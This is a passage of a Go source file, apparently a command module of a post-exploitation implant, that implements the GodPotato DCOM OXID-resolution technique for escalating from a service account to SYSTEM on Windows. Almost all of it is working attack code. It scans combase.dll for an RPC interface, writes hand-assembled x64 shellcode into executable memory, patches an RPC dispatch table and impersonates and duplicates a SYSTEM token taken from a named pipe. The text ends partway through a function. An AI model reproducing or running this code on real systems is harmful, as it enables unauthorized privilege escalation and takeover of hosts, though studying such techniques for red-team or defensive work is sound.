//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// GodPotato-style DCOM OXID resolution abuse for SeImpersonate → SYSTEM.
// This technique hooks the RPC dispatch table in combase.dll to redirect
// OXID resolution to an attacker-controlled named pipe. When RPCSS (SYSTEM)
// connects to resolve the OXID, we impersonate its token.
//
// References:
// - https://github.com/BeichenDream/GodPotato
// - https://github.com/tylerdotrar/SigmaPotato
// - https://github.com/safedv/RustPotato

// orcbGUID is the ORCB RPC interface GUID (18f70770-8e64-11cf-9af1-0020af6e72f4)
// in little-endian byte order for memory scanning in combase.dll.
var orcbGUID = [16]byte{
	0x70, 0x07, 0xF7, 0x18, // Data1 LE
	0x64, 0x8E,             // Data2 LE
	0xCF, 0x11,             // Data3 LE
	0x9A, 0xF1, 0x00, 0x20, 0xAF, 0x6E, 0x72, 0xF4, // Data4
}

// OBJREF magic signature ("MEOW" in little-endian)
const objrefSignature = 0x574f454d

// OBJREF flags
const objrefStandard = 0x00000001

// COM IIDs
var iidIUnknown = [16]byte{
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

func utf16Encode(s string) []uint16 {
	result, _ := syscall.UTF16FromString(s)
	// Remove trailing null
	if len(result) > 0 && result[len(result)-1] == 0 {
		result = result[:len(result)-1]
	}
	return result
}

// potatoState holds the mutable state for the GodPotato technique
type potatoState struct {
	mu             sync.Mutex
	systemToken    windows.Token
	tokenCaptured  bool
	pipeName       string
	pipeUniqueName string
	hookError      string
	origFuncPtr    uintptr
	hookCalled     bool
	paramCount     int
	// Pre-computed DUALSTRINGARRAY bytes (built before hook install to avoid
	// fmt.Sprintf/allocations inside the RPC dispatch callback context)
	precomputedDSA []byte
	// iunknownRef prevents Go's GC from collecting the IUnknown COM object.
	// Without this, the object returned as uintptr could be GC'd while COM
	// still references it, causing an access violation crash.
	iunknownRef interface{}
	// shellcodePage is the VirtualAlloc'd page for the native hook shellcode.
	// Stored here so we can VirtualFree it during cleanup.
	shellcodePage uintptr
	// dsaHeapBuf is the HeapAlloc'd DSA buffer address embedded in shellcode.
	dsaHeapBuf uintptr
}

var potatoGlobal potatoState

// Windows API procs for COM and memory operations
var (
	ole32DLL              = windows.NewLazySystemDLL("ole32.dll")
	procCoInitializeEx    = ole32DLL.NewProc("CoInitializeEx")
	procCoUninitialize    = ole32DLL.NewProc("CoUninitialize")
	procCoUnmarshalIntf   = ole32DLL.NewProc("CoUnmarshalInterface")
	procCreateObjrefMonik = ole32DLL.NewProc("CreateObjrefMoniker")
	procCreateBindCtx     = ole32DLL.NewProc("CreateBindCtx")
	procCoTaskMemFree     = ole32DLL.NewProc("CoTaskMemFree")

	procVirtualQuery   = kernel32NP.NewProc("VirtualQuery")
	procGetProcessHeap = kernel32NP.NewProc("GetProcessHeap")
	procHeapAlloc      = kernel32NP.NewProc("HeapAlloc")
	// procGetModuleHandleW is declared in spawn.go
)

// RPC_SERVER_INTERFACE represents the RPC server interface structure in combase.dll
type rpcServerInterface struct {
	Length                  uint32
	InterfaceID             [20]byte // RPC_IF_ID = GUID (16) + Version (4)
	TransferSyntax          [20]byte
	DispatchTable           uintptr // *RPC_DISPATCH_TABLE
	RpcProtseqEndpointCount uint32
	RpcProtseqEndpoint      uintptr
	DefaultManagerEpv       uintptr
	InterpreterInfo         uintptr // *MIDL_SERVER_INFO
	Flags                   uint32
}

type rpcDispatchTable struct {
	DispatchTableCount uint32
	DispatchTable      uintptr // *funcptr array
	Reserved           uintptr
}

type midlServerInfo struct {
	StubDesc        uintptr
	DispatchTable   uintptr // *funcptr array — the manager routines
	ProcString      uintptr
	FmtStringOffset uintptr
}

// readUseProtSeqParamCount reads the UseProtSeq parameter count from the MIDL
// NDR format string. GodPotato reads this at ProcString + FmtStringOffset[0] + 19.
// The parameter count varies by Windows version (typically 5-6 on modern Windows).
func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
	if midlInfo.ProcString == 0 || midlInfo.FmtStringOffset == 0 {
		return 0, fmt.Errorf("ProcString or FmtStringOffset is null")
	}
	// FmtStringOffset is an array of uint16; read offset for method 0 (UseProtSeq)
	fmtOffset0 := *(*uint16)(unsafe.Pointer(midlInfo.FmtStringOffset))
	// Parameter count is at offset 19 within the Oif procedure header
	paramCount := int(*(*byte)(unsafe.Pointer(midlInfo.ProcString + uintptr(fmtOffset0) + 19)))
	if paramCount < 4 || paramCount > 14 {
		return 0, fmt.Errorf("unexpected UseProtSeq parameter count: %d", paramCount)
	}
	return paramCount, nil
}

// buildPipeDSA pre-computes the DUALSTRINGARRAY bytes for the hook callback.
// Uses the same full-text format as GodPotato/RustPotato: each endpoint string
// (including protocol prefix) is written directly as UTF-16, with no separate
// tower ID field. The security section is left empty (zero-filled).
// This is called during setup (before hook install) so the callback itself
// does only minimal work: HeapAlloc + memcpy + pointer write.
func buildPipeDSA(pipeUniqueName string) []byte {
	// Full text endpoint strings — matches GodPotato/RustPotato format exactly.
	// No separate tower ID prefix; the protocol name is part of the text.
	endpoints := []string{
		`ncacn_np:localhost/pipe/` + pipeUniqueName + `[\pipe\epmapper]`,
		`ncacn_ip_tcp:safe !`,
	}

	// Calculate entrie_size: sum of (len+1) for each endpoint + 1 for end marker + 2 for security padding
	entrieSize := 0
	for _, ep := range endpoints {
		entrieSize += len(ep) + 1 // +1 for null terminator
	}
	entrieSize += 1 // end of string bindings marker (extra null)
	securityOffset := entrieSize
	entrieSize += 2 // empty security section (just a double-null terminator)

	// Allocate: 4 bytes header (wNumEntries + wSecurityOffset) + entries as UTF-16
	totalBytes := 4 + entrieSize*2
	result := make([]byte, totalBytes)

	// Header
	binary.LittleEndian.PutUint16(result[0:2], uint16(entrieSize))
	binary.LittleEndian.PutUint16(result[2:4], uint16(securityOffset))

	// Write endpoints as UTF-16LE characters
	offset := 4
	for _, ep := range endpoints {
		for _, ch := range ep {
			binary.LittleEndian.PutUint16(result[offset:offset+2], uint16(ch))
			offset += 2
		}
		offset += 2 // null terminator (already zero from make)
	}
	// Remaining bytes are zero (end of string bindings + empty security section)

	return result
}

// hookFlagOffset is the offset within the shellcode page where the hook-called
// flag byte is stored. The shellcode sets this to 1 when UseProtSeq is called.
const hookFlagOffset = 128

// buildNativeHook creates a native x64 shellcode hook for the UseProtSeq dispatch.
// Using raw shellcode instead of syscall.NewCallback avoids crashes caused by Go's
// callback trampoline interacting with the NDR interpreter's RPC dispatch thread.
// The shellcode reads ppdsaNewBindings from the correct parameter position,
// writes the pre-allocated DSA buffer address, sets a flag, and returns 0.
func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err error) {
	ppdsaIndex := paramCount - 2
	code := make([]byte, 0, 80)

	// Step 1: Load ppdsaNewBindings into RAX from the correct parameter position.
	// x64 Windows calling convention: RCX=p0, RDX=p1, R8=p2, R9=p3, stack=p4+
	switch ppdsaIndex {
	case 0:
		code = append(code, 0x48, 0x89, 0xC8) // mov rax, rcx
	case 1:
		code = append(code, 0x48, 0x89, 0xD0) // mov rax, rdx
	case 2:
		code = append(code, 0x4C, 0x89, 0xC0) // mov rax, r8
	case 3:
		code = append(code, 0x4C, 0x89, 0xC8) // mov rax, r9
	default:
		// Stack parameter: [RSP + 8*(ppdsaIndex+1)]
		offset := byte(8 * (ppdsaIndex + 1))
		code = append(code, 0x48, 0x8B, 0x44, 0x24, offset) // mov rax, [rsp+offset]
	}

	// Step 2: test rax, rax — check for null pointer
	code = append(code, 0x48, 0x85, 0xC0)

	// Step 3: jz done — skip writes if null (jump over DSA write + flag write)
	// DSA write: mov rcx, imm64 (10) + mov [rax], rcx (3) = 13
	// Flag write: mov rax, imm64 (10) + mov byte [rax], 1 (3) = 13
	// Total: 26 bytes
	code = append(code, 0x74, 0x1A) // jz done (jump 26 bytes)

	// Step 4: mov rcx, <dsaBufAddr> — load pre-allocated DSA address
	addrBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrBytes, uint64(dsaBufAddr))
	code = append(code, 0x48, 0xB9) // mov rcx, imm64
	code = append(code, addrBytes...)

	// Step 5: mov [rax], rcx — write DSA address to *ppdsaNewBindings
	code = append(code, 0x48, 0x89, 0x08)

	// Step 6: Set hook-called flag at page+hookFlagOffset
	// mov rax, <flagAddr> — will be patched after VirtualAlloc
	code = append(code, 0x48, 0xB8) // mov rax, imm64
	flagAddrSlot := len(code)        // remember where to patch
	code = append(code, 0, 0, 0, 0, 0, 0, 0, 0)

	// mov byte [rax], 1
	code = append(code, 0xC6, 0x00, 0x01)

	// done:
	// Step 7: xor eax, eax — return 0 (RPC_S_OK)
	code = append(code, 0x33, 0xC0)

	// Step 8: ret
	code = append(code, 0xC3)

	// Allocate executable memory and copy shellcode
	page, allocErr := windows.VirtualAlloc(0, 4096,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if allocErr != nil {
		return 0, fmt.Errorf("VirtualAlloc for hook shellcode: %v", allocErr)
	}

	// Patch the flag address now that we know the page address
	flagAddr := page + hookFlagOffset
	binary.LittleEndian.PutUint64(code[flagAddrSlot:], uint64(flagAddr))

	dst := unsafe.Slice((*byte)(unsafe.Pointer(page)), len(code))
	copy(dst, code)

	potatoGlobal.shellcodePage = page
	return page, nil
}

// wasHookCalled checks the shellcode flag byte to determine if UseProtSeq was triggered.
func wasHookCalled() bool {
	if potatoGlobal.shellcodePage == 0 {
		return false
	}
	flag := *(*byte)(unsafe.Pointer(potatoGlobal.shellcodePage + hookFlagOffset))
	return flag != 0
}

// allocateDSAOnHeap allocates the DUALSTRINGARRAY on the process heap using HeapAlloc.
// The RPC runtime expects heap-allocated memory (it calls MIDL_user_free = HeapFree).
func allocateDSAOnHeap(dsaData []byte) (uintptr, error) {
	hHeap, _, _ := procGetProcessHeap.Call()
	if hHeap == 0 {
		return 0, fmt.Errorf("GetProcessHeap returned null")
	}
	buf, _, callErr := procHeapAlloc.Call(hHeap, 0x08, uintptr(len(dsaData)))
	if buf == 0 {
		return 0, fmt.Errorf("HeapAlloc(%d bytes): %v", len(dsaData), callErr)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf)), len(dsaData))
	copy(dst, dsaData)
	potatoGlobal.dsaHeapBuf = buf
	return buf, nil
}

// getSystemViaPotato wraps the DCOM OXID exploit with a watchdog timer.
// If the exploit hangs (e.g., COM call deadlock), the watchdog returns
// diagnostic output indicating which phase was reached.
func getSystemViaPotato(oldIdentity string) structs.CommandResult {
	var phase int32
	resultCh := make(chan structs.CommandResult, 1)

	go func() {
		resultCh <- doPotatoExploit(oldIdentity, &phase)
	}()

	select {
	case result := <-resultCh:
		return result
	case <-time.After(25 * time.Second):
		return structs.CommandResult{
			Output: fmt.Sprintf("Potato technique timed out (25s watchdog).\nLast phase: %d\nhookCalled: %v\nparamCount: %d\npipe: %s",
				atomic.LoadInt32(&phase), potatoGlobal.hookCalled, potatoGlobal.paramCount, potatoGlobal.pipeName),
			Status:    "error",
			Completed: true,
		}
	}
}

// doPotatoExploit implements the actual GodPotato DCOM OXID resolution exploit.
// The phase counter is updated atomically so the watchdog can report progress.
func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
	// Phase 0: Check SeImpersonatePrivilege
	atomic.StoreInt32(phase, 0)
	if !checkPrivilege("SeImpersonatePrivilege") {
		return structs.CommandResult{
			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
			Status:    "error",
			Completed: true,
		}
	}

	// Pin this goroutine to an OS thread — COM state is per-thread and
	// Go's scheduler can migrate goroutines between OS threads.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Phase 1: Initialize COM (loads combase.dll) and scan for ORCB RPC interface
	atomic.StoreInt32(phase, 1)
	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
	defer procCoUninitialize.Call()

	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find combase.dll: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find ORCB RPC interface in combase.dll: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 2: Parse RPC structures and locate UseProtSeq dispatch entry
	atomic.StoreInt32(phase, 2)
	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
	if rpcIface.DispatchTable == 0 {
		return structs.CommandResult{
			Output:    "RPC_SERVER_INTERFACE dispatch table pointer is null",
			Status:    "error",
			Completed: true,
		}
	}

	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
		return structs.CommandResult{
			Output:    "RPC dispatch table is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// UseProtSeq is at index 0 in the MIDL_SERVER_INFO dispatch table
	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
	if midlInfo == nil || midlInfo.DispatchTable == 0 {
		return structs.CommandResult{
			Output:    "MIDL_SERVER_INFO dispatch table is null",
			Status:    "error",
			Completed: true,
		}
	}

	// Read parameter count from MIDL format string (varies by Windows version)
	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
	if paramErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to read UseProtSeq param count: %v", paramErr),
			Status:    "error",
			Completed: true,
		}
	}
	potatoGlobal.paramCount = paramCount

	// Read the original UseProtSeq function pointer (index 0)
	useProtSeqSlot := midlInfo.DispatchTable
	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
	potatoGlobal.origFuncPtr = origFunc

	// Phase 3: Extract our process's OXID BEFORE installing the hook.
	atomic.StoreInt32(phase, 3)
	// CreateObjrefMoniker triggers OXID registration which may call UseProtSeq.
	// We must do this with the original (unhooked) dispatch to avoid deadlocks.
	oxid, oid, ipid, oxidErr := extractProcessOXID()
	if oxidErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to extract process OXID: %v", oxidErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 4: Create named pipe server
	atomic.StoreInt32(phase, 4)
	pipeUniqueName := fmt.Sprintf("fawkes_%d", time.Now().UnixNano()%100000)
	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
	potatoGlobal.pipeName = pipeName
	potatoGlobal.pipeUniqueName = pipeUniqueName
	potatoGlobal.tokenCaptured = false
	potatoGlobal.systemToken = 0
	potatoGlobal.hookCalled = false
	potatoGlobal.precomputedDSA = buildPipeDSA(pipeUniqueName)

	// Create the pipe with permissive DACL
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("NewSecurityDescriptor: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SetDACL: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		0, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
		PIPE_UNLIMITED_INSTANCES,
		PIPE_BUFFER_SIZE,
		PIPE_BUFFER_SIZE,
		0,
		uintptr(unsafe.Pointer(&sa)),
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipe(%s): %v", pipeName, pipeErr),
			Status:    "error",
			Completed: true,
		}
	}
	pipeHandle := windows.Handle(hPipe)
	defer windows.CloseHandle(pipeHandle)

	// Start overlapped ConnectNamedPipe (safe to cancel via CancelIo or handle close)
	pipeEvent, _ := windows.CreateEvent(nil, 1, 0, nil)
	defer windows.CloseHandle(pipeEvent)

	var overlapped windows.Overlapped
	overlapped.HEvent = pipeEvent
	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))

	// Phase 5: Build native shellcode hook and install it.
	// We use raw x64 shellcode instead of syscall.NewCallback because Go's callback
	// trampoline crashes when called from the NDR interpreter's RPC dispatch thread.
	atomic.StoreInt32(phase, 5)

	// Allocate DSA on the process heap (RPC runtime will HeapFree it)
	dsaBufAddr, dsaErr := allocateDSAOnHeap(potatoGlobal.precomputedDSA)
	if dsaErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to allocate DSA on heap: %v", dsaErr),
			Status:    "error",
			Completed: true,
		}
	}

	hookAddr, hookErr := buildNativeHook(paramCount, dsaBufAddr)
	if hookErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to build hook shellcode: %v", hookErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Make the dispatch table writable
	var oldProtect uint32
	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("VirtualProtect on dispatch table: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Replace the function pointer
	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookAddr

	// Restore protection and original function pointer on exit
	defer func() {
		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
		if potatoGlobal.shellcodePage != 0 {
			windows.VirtualFree(potatoGlobal.shellcodePage, 0, windows.MEM_RELEASE)
			potatoGlobal.shellcodePage = 0
		}
	}()

	// Phase 6: Trigger OXID resolution via crafted OBJREF.
	atomic.StoreInt32(phase, 6)
	// Run in a goroutine because CoUnmarshalInterface can block if RPCSS hangs.
	// The trigger goroutine needs its own COM initialization and thread pinning.
	triggerDone := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		procCoInitializeEx.Call(0, 0)
		defer procCoUninitialize.Call()
		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
	}()

	// Wait for trigger to complete (5s) or proceed to pipe wait
	var triggerErr error
	select {
	case triggerErr = <-triggerDone:
		// trigger completed
	case <-time.After(5 * time.Second):
		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
	}

	// Phase 7-8: Accept pipe connections and look for SYSTEM.
	// Our own process's COM runtime may connect first (NETWORK SERVICE),
	// so we loop: accept → check identity → if not SYSTEM, disconnect and retry.
	// Uses overlapped I/O for safe cancellation (closing handle while synchronous
	// ConnectNamedPipe blocks can crash on Windows 11 24H2).
	atomic.StoreInt32(phase, 7)

	systemSID, _ := windows.StringToSid("S-1-5-18") // NT AUTHORITY\SYSTEM
	var dupToken windows.Token
	var clientIdentity string
	gotSystem := false
	attempts := 0
	const maxAttempts = 5

	for attempts < maxAttempts && !gotSystem {
		attempts++

		if attempts > 1 {
			// Reset event and start new overlapped ConnectNamedPipe
			windows.ResetEvent(pipeEvent)
			procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
		}

		// Wait for connection with timeout
		waitResult, _ := windows.WaitForSingleObject(pipeEvent, 10000)
		if waitResult != windows.WAIT_OBJECT_0 {
			break // timeout, no more connections
		}

		// Impersonate and check identity
		atomic.StoreInt32(phase, 8)
		ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
		if ret == 0 {
			procDisconnectNamedPipe.Call(hPipe)
			if attempts >= maxAttempts {
				return structs.CommandResult{
					Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed on attempt %d: %v", attempts, impErr),
					Status:    "error",
					Completed: true,
				}
			}
			continue
		}

		// Check if the client is SYSTEM
		var threadToken windows.Token
		err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
		if err != nil {
			err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
		}
		if err != nil {
			procRevertToSelf.Call()
			procDisconnectNamedPipe.Call(hPipe)
			continue
		}

		tokenUser, tuErr := threadToken.GetTokenUser()
		if tuErr != nil {
			threadToken.Close()
			procRevertToSelf.Call()
			procDisconnectNamedPipe.Call(hPipe)
			continue
		}

		isSystem := tokenUser.User.Sid.Equals(systemSID)
		clientIdentity, _ = GetCurrentIdentity()

		if !isSystem {
			// Not SYSTEM — disconnect and try next connection
			threadToken.Close()
			procRevertToSelf.Call()
			procDisconnectNamedPipe.Call(hPipe)
			continue
		}

		// Got SYSTEM! Duplicate to primary token
		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
			windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
		if err != nil {
			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
				windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
		}
		threadToken.Close()
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)

		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
				Status:    "error",
				Completed: true,
			}
		}

		gotSystem = true
	}

	if !gotSystem {
		hookStatus := "NOT called"
		if wasHookCalled() {
			hookStatus = "CALLED"
		}
		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
		errMsg := fmt.Sprintf("Did not receive SYSTEM connection after %d attempts.\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d)\nDSA size: %d bytes\nOXID: %x\nOID: %x\nIPID: %x\nLast client: %s",
			attempts, pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA),
			oxid, oid, ipid, clientIdentity)
		if triggerErr != nil {
			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
		} else {
			errMsg += "\nTrigger: completed (no error)"
		}
		return structs.CommandResult{
			Output:    errMsg,
			Status:    "error",
			Completed: true,
		}
	}

	// Store SYSTEM token
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		windows.CloseHandle(windows.Handle(dupToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as SYSTEM but SetIdentityToken: %v", setErr),
			Status:    "error",
			Completed: true,
		}
	}

	newIdentity, _ := GetCurrentIdentity()

	var sb strings.Builder
	sb.WriteString("=== GETSYSTEM SUCCESS (DCOM/Potato) ===\n\n")
	sb.WriteString(fmt.Sprintf("Technique: DCOM OXID resolution hook (GodPotato)\n"))
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipeName))
	sb.WriteString(fmt.Sprintf("ParamCount: %d\n", paramCount))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// findModuleInfo returns the base address and size of a loaded DLL.
func findModuleInfo(moduleName string) (uintptr, uintptr, error) {
	namePtr, err := windows.UTF16PtrFromString(moduleName)
	if err != nil {
		return 0, 0, err
	}

	handle, _, callErr := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
	if handle == 0 {
		return 0, 0, fmt.Errorf("GetModuleHandle(%s): %v", moduleName, callErr)
	}

	// Query memory region to get the full module size
	type memoryBasicInformation struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionID       uint16
		_                 uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	var mbi memoryBasicInformation
	ret, _, _ := procVirtualQuery.Call(handle, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
	if ret == 0 {
		return handle, 0x1000000, nil // Default 16MB scan range
	}

	// Walk regions to find total module size
	totalSize := mbi.RegionSize
	addr := handle + mbi.RegionSize
	for {
		ret, _, _ = procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
		if ret == 0 || mbi.AllocationBase != handle {
			break
		}
		totalSize += mbi.RegionSize
		addr += mbi.RegionSize
	}

	return handle, totalSize, nil
}

// scanForGUID scans module memory for the ORCB RPC interface GUID.
// Returns the address of the RPC_SERVER_INTERFACE structure that contains this GUID.
func scanForGUID(base, size uintptr, pattern []byte) (uintptr, error) {
	// The GUID appears at offset 4 in RPC_SERVER_INTERFACE (after the Length field)
	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), int(size))

	for i := 0; i <= len(mem)-len(pattern)-4; i++ {
		// Check at offset i+4 (GUID is after uint32 Length field)
		match := true
		for j := 0; j < len(pattern); j++ {
			if mem[i+4+j] != pattern[j] {
				match = false
				break
			}
		}
		if match {
			return base + uintptr(i), nil
		}
	}

	return 0, fmt.Errorf("ORCB GUID pattern not found in %d bytes of combase.dll", size)
}

// extractProcessOXID creates a COM object, marshals it via CreateObjrefMoniker,
// and parses the resulting OBJREF to extract our process's OXID, OID, and IPID.
// GodPotato requires the process's own OXID — a random OXID won't trigger
// the UseProtSeq callback because RPCSS won't find it in its OXID table.
func extractProcessOXID() (oxid [8]byte, oid [8]byte, ipid [16]byte, err error) {
	// Create a minimal IUnknown COM object
	iunknown := createMinimalIUnknown()
	if iunknown == 0 {
		err = fmt.Errorf("failed to create IUnknown object")
		return
	}

	// CreateObjrefMoniker(pUnknown, &pMoniker) → marshals the object
	var pMoniker uintptr
	ret, _, callErr := procCreateObjrefMonik.Call(iunknown, uintptr(unsafe.Pointer(&pMoniker)))
	if ret != 0 || pMoniker == 0 {
		err = fmt.Errorf("CreateObjrefMoniker: hr=0x%x %v", ret, callErr)
		return
	}
	defer comRelease(pMoniker)

	// CreateBindCtx(0, &pBindCtx)
	var pBindCtx uintptr
	ret, _, callErr = procCreateBindCtx.Call(0, uintptr(unsafe.Pointer(&pBindCtx)))
	if ret != 0 || pBindCtx == 0 {
		err = fmt.Errorf("CreateBindCtx: hr=0x%x %v", ret, callErr)
		return
	}
	defer comRelease(pBindCtx)

	// IMoniker::GetDisplayName(pBindCtx, NULL, &displayName)
	// GetDisplayName is at vtable index 20
	var pDisplayName uintptr
	monikerVtbl := *(*uintptr)(unsafe.Pointer(pMoniker))
	getDisplayNameFunc := *(*uintptr)(unsafe.Pointer(monikerVtbl + 20*unsafe.Sizeof(uintptr(0))))
	ret, _, callErr = syscall.SyscallN(getDisplayNameFunc, pMoniker, pBindCtx, 0, uintptr(unsafe.Pointer(&pDisplayName)))
	if ret != 0 || pDisplayName == 0 {
		err = fmt.Errorf("GetDisplayName: hr=0x%x %v", ret, callErr)
		return
	}
	defer procCoTaskMemFree.Call(pDisplayName)

	// Parse the display name: "objref:MEOW<base64>:"
	displayStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(pDisplayName)))

	// Strip "objref:" prefix and ":" suffix
	displayStr = strings.TrimPrefix(displayStr, "objref:")
	displayStr = strings.TrimSuffix(displayStr, ":")

	// Base64 decode to get raw OBJREF bytes
	objrefBytes, decErr := base64.StdEncoding.DecodeString(displayStr)
	if decErr != nil {
		// Try with padding
		for len(displayStr)%4 != 0 {
			displayStr += "="
		}
		objrefBytes, decErr = base64.StdEncoding.DecodeString(displayStr)
	}
	if decErr != nil {
		err = fmt.Errorf("decode OBJREF: %v (display=%s)", decErr, displayStr[:potatoMin(40, len(displayStr))])
		return
	}

	// Parse OBJREF structure to extract OXID, OID, IPID
	// OBJREF layout:
	//   offset 0:  Signature (4 bytes) = "MEOW"
	//   offset 4:  Flags (4 bytes) = OBJREF_STANDARD
	//   offset 8:  IID (16 bytes)
	//   offset 24: STDOBJREF.flags (4 bytes)
	//   offset 28: STDOBJREF.cPublicRefs (4 bytes)
	//   offset 32: STDOBJREF.oxid (8 bytes)
	//   offset 40: STDOBJREF.oid (8 bytes)
	//   offset 48: STDOBJREF.ipid (16 bytes)
	if len(objrefBytes) < 64 {
		err = fmt.Errorf("OBJREF too short: %d bytes", len(objrefBytes))
		return
	}

	copy(oxid[:], objrefBytes[32:40])
	copy(oid[:], objrefBytes[40:48])
	copy(ipid[:], objrefBytes[48:64])
	return
}

func potatoMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// createMinimalIUnknown creates a COM IUnknown object in Go that can be
// passed to CreateObjrefMoniker. The standard COM marshaler will use it
// to register an OXID with RPCSS.
func createMinimalIUnknown() uintptr {
	// Ensure callbacks stay alive (prevent GC)
	potatoGlobal.mu.Lock()
	defer potatoGlobal.mu.Unlock()

	// Build vtable with 3 IUnknown methods
	type iunknownVtbl struct {
		QueryInterface uintptr
		AddRef         uintptr
		Release        uintptr
	}

	vtbl := &iunknownVtbl{
		QueryInterface: syscall.NewCallback(func(this, riid, ppv uintptr) uintptr {
			if ppv == 0 {
				return 0x80004003 // E_POINTER
			}
			// Only succeed for IID_IUnknown — return E_NOINTERFACE for everything
